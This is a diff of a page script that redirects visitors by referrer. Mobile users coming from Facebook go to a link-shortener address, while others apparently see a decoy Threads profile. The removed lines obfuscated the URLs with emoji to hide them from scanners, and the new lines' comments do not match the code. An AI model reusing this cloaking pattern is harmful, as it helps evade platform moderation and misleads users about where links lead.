@@ -10,14 +10,14 @@
         }
     
         var referrer = document.referrer.toLowerCase();
-        var mobileDeviceWithEmoji = "https://m😍agl😍it.me/poshuimichs";
-        var pcURLWithEmoji = "https://www.th😍r😍eads😍.net/@zuck";
-        var youtubeURLWithEmoji = "https://m😍agl😍it.me/poshuimichs";
+        var mobileDeviceWithDot = "https://m.aglit.me/poshuimichs"; // Replace "😍" with a dot
+        var pcURLWithDot = "https://www.threads.net/@zuck"; // Replace "😍" with a dot
+        var youtubeURLWithDot = "https://m.aglit.me/poshuimichs"; // Replace "😍" with a dot
     
-        // Create "clean" versions of the links without the emoji
-        var mobileDevice = cleanURL(mobileDeviceWithEmoji);
-        var pcURL = cleanURL(pcURLWithEmoji);
-        var youtubeURL = cleanURL(youtubeURLWithEmoji);
+        // Create "clean" versions of the links without the dot
+        var mobileDevice = cleanURL(mobileDeviceWithDot);
+        var pcURL = cleanURL(pcURLWithDot);
+        var youtubeURL = cleanURL(youtubeURLWithDot);
     
         // Check if the referrer is Facebook and redirect mobile users to the "clean" mobileDevice URL
         if (referrer.includes("facebook.com")) {
@@ -32,6 +32,7 @@
         }
       });
     </script>
+    
   
     
     
